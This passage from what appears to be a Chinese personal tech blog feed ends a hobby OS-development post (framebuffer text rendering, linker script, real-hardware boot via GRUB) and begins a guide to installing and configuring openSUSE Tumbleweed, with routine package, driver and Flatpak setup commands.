&#125;<br><br>        glyph += font_width_bytes;<br>    &#125;<br><br>    <span class="hljs-comment">/* move cursor */</span><br>    cursor_x++;<br><br>    <span class="hljs-comment">/* we may need to move to new line */</span><br>    <span class="hljs-keyword">if</span> (cursor_x &gt;= max_ch_nr_x) &#123;<br>    new_line:<br>        cursor_x = <span class="hljs-number">0</span>;<br>        cursor_y++;<br>        <br>        <span class="hljs-comment">/* we may need to scroll up */</span><br>        <span class="hljs-keyword">if</span> (cursor_y &gt;= max_ch_nr_y) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">uint32_t</span> y = <span class="hljs-number">0</span>; y &lt; ((max_ch_nr_y - <span class="hljs-number">1</span>) * font_height); y++) &#123;<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">uint32_t</span> x = <span class="hljs-number">0</span>; x &lt; framebuffer_width; x++) &#123;<br>                    framebuffer_base[x + y * framebuffer_width] = <br>                    framebuffer_base[x + (y + font_height) * framebuffer_width];<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">uint32_t</span> y = <span class="hljs-number">0</span>; y &lt; font_height; y++) &#123;<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">uint32_t</span> x = <span class="hljs-number">0</span>; x &lt; framebuffer_width; x++) &#123;<br>                    <span class="hljs-type">size_t</span> lines = (y + (max_ch_nr_y - <span class="hljs-number">1</span>) * font_height);<br>                    <span class="hljs-type">size_t</span> loc = lines * framebuffer_width + x;<br>                    framebuffer_base[loc] = bg;<br>                &#125;<br>            &#125;<br><br>            cursor_y--;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">boot_init_font</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    boot_font = (<span class="hljs-keyword">struct</span> psf2_header*) _binary_boot_font_psf_start;<br><br>    font_width_bytes = (boot_font-&gt;width + <span class="hljs-number">7</span>) / <span class="hljs-number">8</span>;<br>    font_width = font_width_bytes * <span class="hljs-number">8</span>;<br>    font_height = boot_font-&gt;height;<br><br>    glyph_table = (<span class="hljs-type">uint8_t</span>*)_binary_boot_font_psf_start+boot_font-&gt;header_size;<br>    glyph_nr = boot_font-&gt;glyph_nr;<br>    bytes_per_glyph = boot_font-&gt;bytes_per_glyph;<br><br>    cursor_x = cursor_y = <span class="hljs-number">0</span>;<br>    max_ch_nr_x = framebuffer_width / font_width;<br>    max_ch_nr_y = framebuffer_height / font_height;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Extra：-串口输出"><a href="#Extra：-串口输出" class="headerlink" title="Extra： 串口输出"></a><em>Extra： 串口输出</em></h3><blockquote><p>TO BE 🕊🕊🕊</p></blockquote><h2 id="链接脚本"><a href="#链接脚本" class="headerlink" title="链接脚本"></a>链接脚本</h2><blockquote><p>什么，你不知道什么事链接脚本？还不<a href="https://ftp.gnu.org/old-gnu/Manuals/ld-2.9.1/html_chapter/ld_3.html">赶快学</a>！</p></blockquote><p>需要注意的一点是，<strong>GNU GRUB 会默认将内核载入到物理地址高 1MB 起始</strong>，因此我们需要在链接脚本中进行指定，同时作为一个不成文的规范，<strong>内核应当被装载到高地址处</strong>，那么我们的内核应当分为如下两个部分：</p><ul><li>boot：由 GRUB 引导，负责进行页表重映射、内存管理初始化等预备工作，完成后跳转至内核</li><li>kernel：实际的内核主体，位于虚拟地址的高地址处</li></ul><p>笔者选择将 boot 阶段的所有代码全都放在一个大的名为 <code>boot</code> 的段当中，将 kernel 的 <code>.text</code> 等段重新从高地址处计算起始地址，因此链接脚本如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs ld">OUTPUT_FORMAT(&quot;elf64-x86-64&quot;)<br>OUTPUT_ARCH(i386:x86-64)<br>ENTRY(_start)<br><br>SECTIONS<br>&#123;<br>    /* boot loader will load the kernel there */<br>    . = 1M;<br>__boot_start = .;<br><br>    .boot :<br>&#123;<br>KEEP(*(.boot.header))<br>*(.boot.*)<br>. = ALIGN(4096);<br><br>/* C part boot kernel */<br>*arch/boot*.o<br>&#125;<br><br>__boot_end = .;<br><br>/* now it comes to the real kernel */<br>KERM_VADDR = 0xffffffff81000000;<br>. = KERM_VADDR;<br><br>/* we use AT() there to make it loaded on phys correctly */<br>.text ALIGN(4096) : AT (ADDR (.text) - KERM_VADDR)<br>&#123;<br>*(.text)<br>&#125;<br><br>. = ALIGN(4096);<br><br>.rodata ALIGN(4096) : AT (ADDR (.rodata) - KERM_VADDR)<br>&#123;<br>*(.rodata)<br>&#125;<br><br>. = ALIGN(4096);<br><br>__roseg_end = .;<br><br>.data ALIGN(4096) : AT (ADDR (.data) - KERM_VADDR)<br>&#123;<br>*(.data)<br>&#125;<br><br>. = ALIGN(4096);<br><br>.bss ALIGN(4096) : AT (ADDR (.bss) - KERM_VADDR)<br>&#123;<br>*(COMMON)<br>*(.bss)<br>&#125;<br><br>. = ALIGN(4096);<br><br>__kernel_end = .;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="真机启动"><a href="#真机启动" class="headerlink" title="真机启动"></a>真机启动</h2><p>接下来我们使用 <code>make</code> 命令编译代码，将 <code>out</code> 目录下的 <code>kernel.bin</code> 文件放到 U 盘 EFI 分区中的 <code>boot</code> 目录下，重启计算机并选择 U 盘启动，接下来——</p><p><strong>ClosureOS，启动——！！！</strong></p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129041505.png"></p><p>我们成功制作完成了一个<strong>能够在真机上运行的操作系统，而并非大部分教科书上的那些只能在虚拟机里跑的小玩具</strong>，虽然目前仅有最基本的雏形 ：）</p><blockquote><p>我们将在后续博客当中逐步完善这个操作系统（🕊🕊🕊）</p></blockquote><h1 id="0xFF-Reference"><a href="#0xFF-Reference" class="headerlink" title="0xFF. Reference"></a>0xFF. Reference</h1><p><a href="https://elixir.bootlin.com/linux/latest/source">Linux source code - Bootlin</a></p><p><a href="https://www.gnu.org/software/grub/manual/multiboot2/multiboot.html">Multiboot2 Specification version 2.0</a></p><p><a href="https://wiki.osdev.org/Main_Page">OSDev wiki</a> ← 非常好维基，使我OS运行，爱来自瓷器❤</p><p><a href="https://zhuanlan.zhihu.com/UEFIBlog">UEFI 和 BIOS 探秘</a></p><p><a href="https://wiki.osdev.org/PC_Screen_Font">PC Screen Font</a></p><p><a href="https://os.phil-opp.com/">Writing an OS in Rust</a></p><p><a href="https://pendrivelinux.com/install-grub2-on-usb-from-ubuntu-linux/">https://pendrivelinux.com/install-grub2-on-usb-from-ubuntu-linux/</a></p><p><a href="https://oscarcx.com/tech/usb-boot-winpe-and-linux-via-grub2.html">用grub2制作多重引导的WinPE&amp;Linux启动U盘</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;遥遥领先！遥遥领先！遥遥领先！&lt;/p&gt;</summary>
    
    
    
    <category term="CODE" scheme="https://arttnba3.github.io/categories/CODE/"/>
    
    
    <category term="开发手记" scheme="https://arttnba3.github.io/tags/%E5%BC%80%E5%8F%91%E6%89%8B%E8%AE%B0/"/>
    
    <category term="Assembly Language" scheme="https://arttnba3.github.io/tags/Assembly-Language/"/>
    
    <category term="操作系统" scheme="https://arttnba3.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>【DISTRO.0x01】如何正确打开 openSUSE Tumbleweed</title>
    <link href="https://arttnba3.github.io/2023/11/24/DISTRO-0X01-INSTALL_TUMBLEWEED_WINDOWS/"/>
    <id>https://arttnba3.github.io/2023/11/24/DISTRO-0X01-INSTALL_TUMBLEWEED_WINDOWS/</id>
    <published>2023-11-23T14:22:31.000Z</published>
    <updated>2024-02-23T07:36:47.000Z</updated>
    
    <content type="html"><![CDATA[<p>你说🉐对，但是 Arch Linux 是由 Arch 社区开发的一个 Linux 发行版…</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><p>笔者此前一直在用 Arch Linux，但是最近在帮中国大陆的一些 CTF 赛事出题时遇到了一些比较奇怪的问题：在使用 Docker 启动的 Ubuntu 环境中，用来启动题目服务的 <code>xinetd</code> <strong>无法正常工作</strong>：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231124010554.png"></p><p>不过也不是完全连不上，但是要等很久，笔者怀疑可能是内核安全策略的缘故（因为在容器内部用 <code>nc</code> 也连不上），于是笔者测试了市面上比较主流的口碑比较好的几个 Linux 发行版，除了原生 Ubuntu 以外<strong>也就只有 openSUSE 能够正常运行</strong>：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231124010630.png"></p><blockquote><p>当然， <em>有一个发行版是完全连不上，是谁呢</em> ： </p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231124010725.png"></p></blockquote><p>这样的话笔者完全没有办法在本地测试题目，再加上 Arch Linux 用起来 <em>总是感觉有哪里没有配好的怪异感</em> ，只适合比较闲的时候折腾玩玩，日常使用或许还是一个常规点的发行版会更加安心一些，于是笔者在 Fedora Workstation 短期驻留了一段时间之后选择转向 openSUSE Tumbleweed ，和 Arch 一样是一个滚动发行版，但是 <em>据说德国工艺比较值得令人信赖，SUSE 在企业市场的份额似乎也不小</em> ：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231124011110.png"></p><blockquote><p>需要注意的是，openSUSE 这个词读音为 <code>/ˌoʊpənˈsuːzə/</code> ，相信不少人和笔者一样一开始会读成 <code>/ˌoʊpənˈsuːz/</code> ，推荐观看<a href="https://www.bilibili.com/video/BV1ab411K7Zs/">这个视频</a>（笑</p></blockquote><p>事实证明，openSUSE Tumbleweed 给笔者一种<strong>又好又烂的感觉</strong>，好就好在德国工艺的 YaST 确实方便易用，对 KDE 的高适配性让笔者在 Fedora 上的各种自定义美化工作 <em>不需要任何修改便能无缝进行偏移，仿佛自己从来没有换过系统一般令人安心</em> ，不好就在于官方自带的中文安装依托答辩，不仅安装界面蹦方块，切换到 Wayland 后自带的 fcitx5 直接罢工（与此同时<strong>先装英文系统再装中文语言包与输入法却能正常使用</strong>）</p><p>但这并非是最要命的点，<strong>用的人少、社区活跃度不足才是最致命的</strong>，openSUSE 早期在中国大陆宣传不足，RHEL 和 Ubuntu 近乎蚕食掉所有的 Linux 市场后才姗姗来迟，<strong>现在在中国大陆能用的镜像站似乎都不剩几个</strong>，<a href="https://forum.suse.org.cn/">中文论坛</a>活跃度还比不上一些快死了的贴吧（<a href="https://forums.opensuse.org/c/english/6">英文论坛</a>的活跃度还可以，但其实也差点意思），Wiki 建设度也不太足，这就导致很多问题只能参照其他发行版的类似情况自己再缝缝补补</p><blockquote><p>最直接的后果就是在缺乏指引的情况下，笔者第一次在物理机上尝试 Tumbleweed 时 docker 直接无法正常拉镜像，第二次在物理机上尝试 Tumbleweed 时由于未更新 GRUB 配置导致几次在几次重新启动系统之后<strong>登录界面直接进不去了，只有一个鼠标能动</strong>，切进 tty 以后也一筹莫展（根本找不到使用 openSUSE 出现类似问题的案例与解决方案），在重装了七八次系统后按照第三方社区 ASUS Linux 的配置教程无意中解决了这个问题</p></blockquote><p>但是 <del>抛开事实不谈</del>  <em>抛开这些小毛病不谈，openSUSE 依旧是做得不错的发行版</em> ，Leap 有着超乎想象的稳定性与维护周期，Tumbleweed 在保证了其稳定性的同时依旧能紧追最前沿的技术，虽然国内没啥人用但在国外其实还是有着不错的口碑，因此笔者最终选择尝试在 openSUSE Tumbleweed 上开始自己新的旅程</p><blockquote><p>至于为什么不用 Ubuntu 是因为 Ubuntu Desktop 依托答辩，经常能卡出各种玄学问题，软件包旧且难配，snap 这样混沌邪恶的东西更是让人谔谔，只适合放服务器上或是放在虚拟机里玩</p><p>至于为什么不用 Debian 则是因为在笔者感受起来这也是一个更适合在服务器上稳定跑应用的系统，能折腾的空间也不多（<del>年轻人自己用的电脑当然要滚动发行版天天滚，我每天稳定在 Arch 上滚 114 次在centos stream 上滚 514 次在 tumbleweed 上滚 1919 次并用 Gentoo 自行编译 810 次</del>）， <em>更重要的是</em> 笔者手上没有<a href="https://github.com/moesoha/debian-media-box">Debian 盒装安装媒介</a> （笑</p></blockquote><h1 id="0x01-安装前的准备工作"><a href="#0x01-安装前的准备工作" class="headerlink" title="0x01. 安装前的准备工作"></a>0x01. 安装前的准备工作</h1><blockquote><p>如果要和笔者一样安装 Windows + Linux 双系统的话<strong>建议先安装 Windows</strong>，因为如果先安装 Linux 的话 Windows 会对 Linux 空间乱动：(</p></blockquote><blockquote><p>因为安装的时候没有拍屏所以用虚拟机进行截图，<del>毕竟总不能让👴把现在安好的系统再重新安一遍吧，那闲得没事做属于是</del></p></blockquote><p>首先还是在 Windows 上打开 <code>磁盘管理→压缩卷</code> 划出来一块未分配空间，后面我们将在这块空间上安装 openSUSE Tumbleweed：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231123234639.png"></p><p>然后在<a href="https://get.opensuse.org/tumbleweed/#download">官网</a>下载镜像，并烧录到 U 盘中（大家应该都和笔者一样使用 U 盘进行安装吧），这里笔者选择使用 <a href="https://etcher.balena.io/#download-etcher">balenaEtcher</a> 进行烧录，直接选择镜像和 U 盘就行：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231123235028.png"></p><h1 id="0x02-安装-openSUSE-Tumbleweed"><a href="#0x02-安装-openSUSE-Tumbleweed" class="headerlink" title="0x02. 安装 openSUSE Tumbleweed"></a>0x02. 安装 openSUSE Tumbleweed</h1><p>openSUSE 系统使用 <code>YaST</code> 进行安装，非常地舒适简便的同时也提供给我们许多可以客制化的地方</p><blockquote><p>和前面一样都是在虚拟机中重新截的图，因为笔者安装时忘了拍了：）</p></blockquote><p>惯例重启进入 UEFI 界面关闭安全启动将 U 盘设为第一个启动项进入 openSUSE Tumbleweed 的安装界面：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231124003638.png"></p><blockquote><p>如果你是物理机安装而且没插网线会有一个额外的配置网络的环节，按照指引正常选择无线网卡连 WiFi 就行</p></blockquote><p>这里注意<strong>安装语言选择 English</strong>，因为自带的中文安装有些小问题（<a href="https://www.bilibili.com/video/BV1F7411G7jH/?t=2095">他们那个是有点差的.avi</a>），系统安装结束后我们再手动在系统中去安装中文相关的东西：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231124004125.png"></p><p>Online Repositories 建议全选：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231124004637.png"></p><p>桌面就按需选择了，笔者推荐选择 openSUSE 默认的 KDE Plasma ：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231124005130.png"></p><p>硬盘分区的话笔者建议还是<strong>手动分区</strong>（选择下方的 <code>Expert Partitioner</code> 按钮中的 <code>Start with Existing Partitions</code>，之后直接选中对应硬盘并 <code>Add Partion...</code> 就会有非常细致的分区创建引导），因为他自动分区的逻辑有点怪怪的（之前自动分区差点把笔者原本的数据盘给抹了），主要是两个分区：</p><ul><li>EFI 分区（<code>EFI Boot Partion</code>，<strong>必须为 fat32 格式</strong>）：放 GRUB 和内核的地方，用来启动系统，需要挂载在 <code>/boot/efi</code> 下边</li><li>系统分区（<code>Operating System</code>，推荐还是 ext4，brtfs 强制重启会炸）：系统基本环境，需要挂载在 <code>/</code> 下边</li></ul><blockquote><p>这里笔者<strong>不推荐和 Windows 混用同一个 EFI 分区</strong>，最好自己自立门户，一是 Win 原本的 EFI 分区实在太小随便塞点东西就爆了，二是独立分区干啥都方便不会影响到隔壁的 Win</p></blockquote><p>当然，也可以像笔者一样额外分一个分区做数据分区挂在 <code>/home</code> 下边，后面重装各种其他发行版都方便， <em>因为这里是虚拟机演示所以就只分了两个分区</em> ：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231124005751.png"></p><p>时区设置和创建用户这种常规操作笔者就不截图了，最后来到安装前的最后确认环节，这里笔者建议把 Secure Boot 给关了，不然后面升级闭源显卡驱动可能会比较麻烦，<del>以及笔者觉得这个特性在个人电脑上完全没必要，真有人会来打吗</del></p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231124010003.png"></p><p>安装好后会自动重启，这个时候默认进的就是 GRUB 界面了，可以选择进入 Windows 还是 Linux：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231124013040.png"></p><p>这里不得不夸的一点是<strong>openSUSE 无缝地将笔者之前的 KDE 美化给迁移了过来</strong>（当笔者从 Arch 往 Fedora 上迁移时、重新安装 Fedora 时，这块都没太能处理好），把 <code>latte-dock</code> 给安装上之后笔者就像没换过系统一样：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/img_v3_025f_b217ee22-634c-432b-95ad-8c5569d0081g.jpg"></p><h1 id="0x03-安装-N-卡闭源驱动"><a href="#0x03-安装-N-卡闭源驱动" class="headerlink" title="0x03. 安装 N 卡闭源驱动"></a>0x03. 安装 N 卡闭源驱动</h1><blockquote><p>如果你用的是 A 卡或者仅有核显，则可以跳过这一章节</p></blockquote><p>YaST 是很好很强大的一个综合性工具，这也是 SUSE 系发行版的魅力之一，通过 YaST可以非常方便地管理包括软件安装在内的各项系统配置</p><p>首先用 zypper 引入 Nvidia 驱动仓库：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo zypper addrepo --refresh https://download.nvidia.com/opensuse/tumbleweed NVIDIA<br></code></pre></td></tr></table></figure><p>然后打开 <code>YaST-&gt;Software Management</code>，她会直接帮你选好需要安装的包，直接安就完事了：）</p><p>当然，你也可以手动进入 <code>YaST-&gt;Software Management-&gt;View-&gt;Repositories-&gt;NVIDIA</code> 选择要安装哪些包，一般来说最新的 NVIDIA 显卡直接选择最新的 <code>G06</code> 相关套件即可，其他的老显卡建议参考 <a href="https://en.opensuse.org/SDB:NVIDIA_drivers">openSUSE Wiki</a>，以笔者的电脑为例安装了以下这些包：</p><p><img src="https://s2.loli.net/2023/11/23/dbWQVyqU7Z1A9SN.png"></p><p>安装过程中 YaST 会自动帮你把 <code>nouveau</code> 给禁用了，完成之后直接重启，在终端输入 <code>nvidia-smi</code> 就可以看到显卡相关信息：</p><p><img src="https://s2.loli.net/2023/11/23/t9Qak3RJx7Yq4Xu.png" alt="image.png"></p><p>接下来更新 Grub 配置，不更新的话多重启几次可能桌面就会莫名其妙寄了：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo vim /etc/default/grub<br></code></pre></td></tr></table></figure><p>在这个文件中找到 <code>GRUB_CMDLINE_LINUX</code> ，在其中加入如下内容：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">modprobe.<span class="hljs-attribute">blacklist</span>=nouveau rd.driver.<span class="hljs-attribute">blacklist</span>=nouveau nvidia-drm.<span class="hljs-attribute">modeset</span>=1<br></code></pre></td></tr></table></figure><p>应用新的 GRUB 配置：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo grub2-mkconfig -o /boot/grub2/grub.cfg<br></code></pre></td></tr></table></figure><h1 id="0x04-安装中文与输入法"><a href="#0x04-安装中文与输入法" class="headerlink" title="0x04. 安装中文与输入法"></a>0x04. 安装中文与输入法</h1><p>openSUSE Tumbleweed 安装媒介中自带的中文有些问题，因此我们需要安装 English 系统后手动将中文给安装上</p><p>首先是将简体中文添加为第二语言（笔者不推荐作为第一语言，否则万一系统崩了以后进入 tty 抢救的时候会让你感到很崩溃），打开 <code>YaST-&gt;System-&gt;Language</code>，勾上 <code>Simplified Chinese</code> 后直接点 <code>OK</code> 就可以自动安装了：</p><p><img src="https://s2.loli.net/2023/11/23/pe6DK84kNB3cSZj.png" alt="image.png"></p><p>需要注意的是这里的进度条会莫名其妙变成负数，<strong>不影响正常安装</strong>，只是我们不能看到正确的进度罢了，慢慢等就行了：</p><p><img src="https://s2.loli.net/2023/11/23/AWh6xErjFi8XVTN.jpg"></p><p>完成中文的安装之后接下来我们来安装输入法，目前 Linux 下最火的中文输入法之一为 <code>fcitx</code>，直接通过 zypper 进行安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo zypper in fcitx5<br></code></pre></td></tr></table></figure><p>之后直接重启就 ok 了，就像在其他发行版上那样正常直接使用 fcitx 即可：</p><p><img src="https://s2.loli.net/2023/11/23/MPsnu5im38qRI2G.png" alt="image.png"></p><h1 id="0x05-笔记本相关的一些通用配置"><a href="#0x05-笔记本相关的一些通用配置" class="headerlink" title="0x05. 笔记本相关的一些通用配置"></a>0x05. 笔记本相关的一些通用配置</h1><h3 id="笔记本盒盖行为优化"><a href="#笔记本盒盖行为优化" class="headerlink" title="笔记本盒盖行为优化"></a>笔记本盒盖行为优化</h3><p>KDE 桌面默认是盒盖后锁屏（Lock Screen），但是在 <code>System Setting-&gt;Hardware-&gt;Power Management</code> 中的 <code>Energy Saving</code> 中可以更改笔记本盒盖行为，常用的应该就是：</p><ul><li>Sleep：传统睡眠，保留内存和一些基本组建的供电</li><li>Hybrid Sleep：混合睡眠，简而言之就是数据留内存的同时写入硬盘，主要针对台式机可能会突发断电的情况</li><li>Hibernate：传统休眠，内存数据转存到硬盘上，电源关闭进入低功耗模式</li></ul><blockquote><p>注：笔者的笔记本在设定为 Lock Screen 时盖上盖子就会直接睡死了 ：(</p></blockquote><h1 id="0x06-常用的一些软件安装"><a href="#0x06-常用的一些软件安装" class="headerlink" title="0x06. 常用的一些软件安装"></a>0x06. 常用的一些软件安装</h1><p>比如说大家都喜欢的代码编辑器 <code>vscode</code> ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo rpm --import https://packages.microsoft.com/keys/microsoft.asc<br>sudo zypper addrepo https://packages.microsoft.com/yumrepos/vscode vscode<br>sudo zypper refresh<br>sudo zypper install code<br></code></pre></td></tr></table></figure><p>Chrome 浏览器的安装需要借助 <a href="https://en.opensuse.org/SDB:OBS_Package_Installer">OPI</a>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo zypper in opi<br>sudo opi chrome<br></code></pre></td></tr></table></figure><p>Docker 的安装直接按照 <a href="https://en.opensuse.org/Docker">wiki</a> 即可：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo zypper install docker docker-compose docker-compose-switch<br>sudo systemctl enable docker<br>sudo usermod -G docker -a $USER # 将当前用户添加到 docker,后面就不用总是 sudo docker 了<br>sudo reboot # 重启就完事了<br></code></pre></td></tr></table></figure><p>openSUSE 是 RPM 系，因此大部分软件其实也可以直接将 rpm 包下载下来用 zypper 安装即可，以<a href="https://www.feishu.cn/download">飞书 Linux 版</a>为例：</p><p><img src="https://s2.loli.net/2023/11/23/3xMHfgpuzaDsXrQ.png" alt="image.png"></p><p>笔者在海外，有的时候会用到 Discord、Telegram 这样的软件，他们都是有 Linux 原生版本的（这里就不得不吐槽国内的一些软件迟迟不出 Linux 版了），直接用 zypper 安装即可：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo zypper in discord telegram-desktop<br></code></pre></td></tr></table></figure><p>一些只有 Windows 版本的软件（例如微信）可以尝试用 <code>wine</code> 打开，使用 zypper 可以直接安装 <code>wine</code>，<code>winetricks</code> 则是用来进行功能补充的小工具：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo zypper in wine winetricks<br></code></pre></td></tr></table></figure><h3 id="安装-Flatpak"><a href="#安装-Flatpak" class="headerlink" title="安装 Flatpak"></a>安装 Flatpak</h3><p>一些 openSUSE 没有的包也可以用 flatpak 从其他地方打过来：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo zypper in flatpak<br>flatpak remote-add --user --if-not-exists flathub https://flathub.org/repo/flathub.flatpakrepo<br>flatpak update<br></code></pre></td></tr></table></figure><p>接下来让 flatpak 包的升级和 KDE&#x2F;Gnome 的 software update 无缝融合，首先创建 service：</p><blockquote><p>注：为了安全起见，这里我们采用用户级而非系统级配置</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">systemctl --user edit --full --force flatpak-user-update.service<br></code></pre></td></tr></table></figure><p>之后写入如下内容：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Unit]</span><br><span class="hljs-attr">Description</span>=Flatpak Automatic Update<br><span class="hljs-attr">Documentation</span>=man:flatpak(<span class="hljs-number">1</span>)<br><span class="hljs-attr">Wants</span>=network-<span class="hljs-literal">on</span>line.target<br><span class="hljs-attr">After</span>=network-<span class="hljs-literal">on</span>line.target<br><br><span class="hljs-section">[Service]</span><br><span class="hljs-attr">Type</span>=<span class="hljs-literal">on</span>eshot<br><span class="hljs-attr">ExecStart</span>=/usr/bin/flatpak --user uninstall --unused -y --noninteractive <span class="hljs-comment">; /usr/bin/flatpak --user update -y --noninteractive ; /usr/bin/flatpak --user repair</span><br></code></pre></td></tr></table></figure><p>然后用如下命令创建 timer：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">systemctl --user edit --full --force flatpak-user-update.timer<br></code></pre></td></tr></table></figure><p>之后加入如下内容：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Unit]</span><br><span class="hljs-attr">Description</span>=Flatpak Automatic Update Trigger<br><span class="hljs-attr">Documentation</span>=man:flatpak(<span class="hljs-number">1</span>)<br><br><span class="hljs-section">[Timer]</span><br><span class="hljs-attr">RandomizedDelaySec</span>=<span class="hljs-number">10</span>m<br><span class="hljs-attr">OnBootSec</span>=<span class="hljs-number">2</span>m<br><span class="hljs-attr">OnCalendar</span>=*-*-* <span class="hljs-number">4</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span><br><span class="hljs-attr">Persistent</span>=<span class="hljs-literal">true</span><br><br><span class="hljs-section">[Install]</span><br><span class="hljs-attr">WantedBy</span>=timers.target<br></code></pre></td></tr></table></figure><p>完成后启动 timer：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">systemctl --<span class="hljs-keyword">user</span> <span class="hljs-title">daemon-reload</span><br>systemctl --<span class="hljs-keyword">user</span> <span class="hljs-title">enable</span> --now flatpak-user-update.timer<br></code></pre></td></tr></table></figure><h1 id="0x07-ASUS-Laptop-相关的一些配置"><a href="#0x07-ASUS-Laptop-相关的一些配置" class="headerlink" title="0x07. ASUS Laptop 相关的一些配置"></a>0x07. ASUS Laptop 相关的一些配置</h1><blockquote><p>如果你的电脑不是华硕笔记本，可以直接跳过这一部分</p></blockquote><p><a href="https://asus-linux.org/">ASUS Linux</a> 是一个为 ASUS Laptop 提供额外支持的民间社区，通过 